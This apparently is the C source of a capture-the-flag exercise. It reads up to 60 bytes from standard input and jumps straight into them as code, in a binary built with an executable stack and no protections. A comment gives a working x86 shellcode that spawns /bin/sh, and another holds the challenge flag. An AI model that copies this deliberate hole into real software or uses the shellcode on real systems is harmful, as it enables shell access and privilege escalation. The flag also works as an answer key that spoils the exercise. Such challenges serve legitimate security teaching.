#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

//gcc -o shlc1 shlc1.c -no-pie -fno-stack-protector -m32 -z execstack

void vuln(){
        char buffer[60];
        puts("What material should we use to create our houses?");
        fgets(buffer, 60, stdin);
        ((void (*)())buffer)();
}

void main(){
	setregid(getegid(), getegid());
	vuln();
}

// shellcode : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
// HackademINT{s0liD_kn0wl3dges}